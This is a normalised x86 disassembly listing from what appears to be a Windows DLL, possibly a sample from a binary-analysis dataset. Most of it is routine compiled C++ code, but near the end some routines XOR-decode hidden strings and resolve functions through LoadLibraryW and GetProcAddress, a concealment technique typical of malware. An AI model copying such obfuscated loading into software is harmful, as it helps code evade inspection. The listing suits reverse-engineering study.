mov [ ebp + 0x14 ] ecx
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x60 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x64 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
and [ ebp - 0x4c ] 0x0
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x84 ] edx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push 0x30
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x2c ]
call sub_1003f510
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x8c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_100582fb
add esp 0x4c
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov eax [ ebp - 0x8c ]
call sub_1004fa89
retn
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x68 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
and [ ebp - 0x54 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ ebx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003e9ec
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x54 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000bddb
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_1003f510
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x4c ]
mov eax [ ebp - 0x60 ]
push 0x30
lea ecx [ ebp - 0x2c ]
test eax eax
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_1003e9ec
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x68 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
mov ecx r--data
push [ ebp - 0x74 ]
sub eax esi
mov [ ebp - 0x60 ] eax
inc eax
push eax
call sub_1000bddb
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x60 ]
call sub_1000bddb
and [ ebp - 0x74 ] 0x0
push [ ebp - 0x5c ]
call sub_1003f510
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call sub_1007d0f0
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x84 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push 0x0
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_1000bddb
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_1003cc9a
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004db33
add esp 0x14
pop ebp
retn 0x10
sub_1003ccc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082460
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x71c71c7
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_10003bb0
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10052bf0
mov edi [ esi + 0x4 ]
mov ecx [ esi ]
mov edx edi
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax + eax * 8 ]
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx + ebx * 8 ]
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
mov eax ecx
call sub_10020290
mov ecx [ esi ]
push ecx
call sub_1006591f
add esp 0x4
sub_1003cdcb
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005df49
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1003ce70
push ebp
mov ebp esp
push 0xffffffff
push sub_1008185d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10023b00
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_10043190
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
push 0x24ac4
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1006bcb0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_10050437
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10035d20
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10055ba0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100417c0
push esi
push ebx
call sub_10022030
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10011560
mov eax [ ebp - 0x120 ]
push eax
call sub_1006591f
add esp 0x14
sub_1003d6b5
push 0x38
mov eax sub_1007f89a
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10059065
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10069ce0
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10058a63
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1003d790
push ebp
mov ebp esp
push 0xffffffff
push sub_100809ee
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
xor ebx ebx
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_10019180
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
push ebx
lea eax [ edi + 0x1c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_10019180
mov [ ebp - 0x4 ] 0x1
mov cx [ edi + 0x38 ]
mov [ esi + 0x38 ] cx
push 0xffffffff
lea ecx [ esi + 0x3c ]
push ebx
lea eax [ edi + 0x3c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_10019180
push 0xffffffff
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x2
push ebx
lea eax [ edi + 0x58 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_10019180
mov cl [ edi + 0x74 ]
mov [ esi + 0x74 ] cl
mov edx [ edi + 0x78 ]
mov [ esi + 0x78 ] edx
mov eax [ edi + 0x7c ]
mov [ esi + 0x7c ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1003d870
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov [ eax ] edx
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
retn
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov [ eax ] edx
retn
sub_1003d8d0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1003d910
push ebp
mov ebp esp
push ecx
push edi
lea edi [ ebp - 0x4 ]
mov edx esi
mov ecx ebx
call sub_1006c890
pop edi
test eax eax
js r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push eax
mov eax esi
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
sub_1003d950
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
push ecx
push edx
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
xor eax eax
call sub_1003bc70
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1003da40
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0xbc ] 0x0
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb5
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x14
jb r-xdata
xor eax eax
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x30 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
